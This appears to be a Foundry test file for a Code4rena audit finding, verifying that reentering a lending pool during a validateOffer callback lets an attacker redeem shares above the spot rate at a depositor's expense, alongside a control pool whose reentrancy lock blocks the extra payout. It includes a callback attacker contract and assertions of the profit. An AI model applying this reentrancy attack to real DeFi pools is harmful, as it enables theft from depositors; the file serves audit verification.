// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import {
    Exploit,
    Terms,
    Asset
} from "./35218-h-16-validateoffer-reentry-to-manipulate-exchangerate-code4r.sol";

interface IGuardedValidator {
    function validateOffer(uint256 principalAmount) external;
}

/// Same accounting bug, but a lock stays set from validateOffer until the principal leaves.
/// redeem during the validator callback hits the lock. A guard that drops when validateOffer
/// returns would not cover this window: the callback runs after that return.
contract GuardedPool {
    uint256 private constant BPS = 10_000;
    uint256 private constant ENTERED = 2;

    struct OutstandingValues {
        uint128 principalAmount;
        uint128 accruedInterest;
        uint128 sumApr;
        uint128 lastTs;
    }

    Asset public asset;
    address public loan;
    uint256 public totalSupply;
    uint256 private _status = 1;
    mapping(address => uint256) public balanceOf;
    OutstandingValues internal _outstandingValues;

    constructor(Asset _asset) {
        asset = _asset;
    }

    function acceptLoan(address _loan) external {
        loan = _loan;
    }

    function approveSpender(address spender) external {
        asset.approve(spender, type(uint256).max);
    }

    function seed(address attacker, address victim) external {
        asset.mint(address(this), Terms.CASH);
        _outstandingValues.principalAmount = uint128(Terms.OUTSTANDING);
        _outstandingValues.lastTs = uint128(block.timestamp);
        balanceOf[attacker] = Terms.ATTACKER_SHARES;
        balanceOf[victim] = Terms.VICTIM_SHARES;
        totalSupply = Terms.ATTACKER_SHARES + Terms.VICTIM_SHARES;
    }

    function totalAssets() public view returns (uint256) {
        return asset.balanceOf(address(this)) + uint256(_outstandingValues.principalAmount);
    }

    function previewRedeem(uint256 shares) public view returns (uint256) {
        return shares * totalAssets() / totalSupply;
    }

    function redeem(uint256 shares, address receiver) external returns (uint256 assetsOut) {
        require(_status != ENTERED, "reentrancy");
        uint256 owned = balanceOf[msg.sender];
        require(owned >= shares, "shares");
        assetsOut = shares * totalAssets() / totalSupply;
        balanceOf[msg.sender] = owned - shares;
        totalSupply -= shares;
        asset.transfer(receiver, assetsOut);
    }

    function validateOffer(bytes calldata _offer, uint256 _protocolFee) external {
        require(msg.sender == loan, "caller");
        require(_status != ENTERED, "reentrancy");
        _status = ENTERED;
        (uint256 principalAmount, uint256 apr) = abi.decode(_offer, (uint256, uint256));
        uint256 netApr = apr * (BPS - _protocolFee) / BPS;
        _outstandingValues.sumApr += uint128(netApr * principalAmount);
        _outstandingValues.principalAmount += uint128(principalAmount);
        _outstandingValues.lastTs = uint128(block.timestamp);
    }

    function releaseOffer() external {
        require(msg.sender == loan, "caller");
        _status = 1;
    }
}

contract GuardedLoan {
    Asset public asset;
    GuardedPool public pool;
    address public borrower;
    uint256 public pulled;

    constructor(Asset _asset, GuardedPool _pool) {
        asset = _asset;
        pool = _pool;
        borrower = msg.sender;
    }

    function emitLoan(uint256 principal, uint256 apr, uint256 protocolFee, address validator) external {
        pool.validateOffer(abi.encode(principal, apr), protocolFee);
        IGuardedValidator(validator).validateOffer(principal);
        asset.transferFrom(address(pool), borrower, principal);
        pulled = principal;
        pool.releaseOffer();
    }
}

/// Tries the same redeem inside the callback. The guard makes the call return false.
contract GuardedAttacker {
    GuardedPool public pool;
    uint256 public shares;
    uint256 public received;

    function arm(GuardedPool _pool, uint256 _shares) external {
        pool = _pool;
        shares = _shares;
    }

    function validateOffer(uint256) external {
        (bool ok, bytes memory data) = address(pool).call(
            abi.encodeWithSignature("redeem(uint256,address)", shares, address(this))
        );
        if (ok && data.length >= 32) {
            received = abi.decode(data, (uint256));
        }
    }

    function redeemFair() external returns (uint256 payout) {
        payout = pool.redeem(shares, address(this));
    }
}

contract Finding35218Test is Test {
    address constant ATTACKER = 0x1111111111111111111111111111111111111111;
    // Playground's first CREATE from 0x1111… is nonce 1. Children follow Exploit's nonce.
    address constant EXPLOIT = 0x15452EC016c4dc8c549E7fe6Ff4b26324Ea8b7A4;
    address constant TOKEN = 0x8ea53755A6CB335DD77e8DfBE91078CF210015C7;
    address constant POOL = 0x671D353A77015fA0B747f24eb2a50b0E3340BD1d;
    address constant LOAN = 0xce01759B82FD6cbf9DA468ae79fdcACc4605a5c5;
    address constant VALIDATOR = 0xbd4Fd5A3ceb32dA8dB79559A1C535578c0F8E57D;

    function _deploy() internal returns (Exploit e) {
        vm.setNonce(ATTACKER, 1);
        vm.prank(ATTACKER);
        e = new Exploit();
    }

    function test_exploit_redeems_above_spot() public {
        Exploit e = _deploy();
        assertEq(address(e), EXPLOIT, "exploit");
        assertEq(address(e.asset()), TOKEN, "token");
        assertEq(address(e.pool()), POOL, "pool");
        assertEq(address(e.loan()), LOAN, "loan");
        assertEq(address(e.validator()), VALIDATOR, "validator");
        e.run();

        emit log_named_uint("spot", e.spotAssets());
        emit log_named_uint("received", e.receivedAssets());
        emit log_named_uint("extra", e.extraAssets());
        emit log_named_uint("rate before", e.rateBefore());
        emit log_named_uint("rate during", e.rateDuring());
        emit log_named_uint("victim shortfall", e.victimShortfall());
        emit log_address(address(e));
        emit log_address(address(e.asset()));
        emit log_address(address(e.pool()));
        emit log_address(address(e.loan()));
        emit log_address(address(e.validator()));

        assertEq(e.spotAssets(), Terms.SPOT, "spot");
        assertEq(e.receivedAssets(), Terms.RECEIVED, "received");
        assertEq(e.extraAssets(), Terms.EXTRA, "extra");
        assertEq(e.rateBefore(), Terms.RATE_SPOT, "rate before");
        assertEq(e.rateDuring(), Terms.RATE_INFLATED, "rate during");
        assertEq(e.cashDuring(), Terms.CASH, "cash still there");
        assertEq(e.victimShortfall(), Terms.EXTRA, "lp loss");
        assertEq(e.asset().balanceOf(address(e.validator())), Terms.RECEIVED, "attacker tokens");
        assertGt(e.receivedAssets(), e.spotAssets(), "not above spot");
    }

    function test_control_reentrancy_guard_extra_is_zero() public {
        Asset asset = new Asset();
        GuardedPool pool = new GuardedPool(asset);
        GuardedLoan loan = new GuardedLoan(asset, pool);
        GuardedAttacker attacker = new GuardedAttacker();
        pool.acceptLoan(address(loan));
        pool.seed(address(attacker), Terms.VICTIM);
        pool.approveSpender(address(loan));
        attacker.arm(pool, Terms.ATTACKER_SHARES);

        uint256 spot = pool.previewRedeem(Terms.ATTACKER_SHARES);
        assertEq(spot, Terms.SPOT, "control spot");

        loan.emitLoan(Terms.PRINCIPAL, Terms.APR_BPS, Terms.PROTOCOL_FEE, address(attacker));

        assertEq(attacker.received(), 0, "callback payout");
        assertEq(loan.pulled(), Terms.PRINCIPAL, "loan settled");
        uint256 fair = attacker.redeemFair();
        uint256 extra = fair > spot ? fair - spot : 0;
        assertEq(fair, spot, "fair redeem");
        assertEq(extra, 0, "extra");
        assertEq(asset.balanceOf(address(attacker)), Terms.SPOT, "attacker kept the spot amount");
        assertLt(asset.balanceOf(address(attacker)), Terms.RECEIVED, "guard blocked the extra");
    }
}
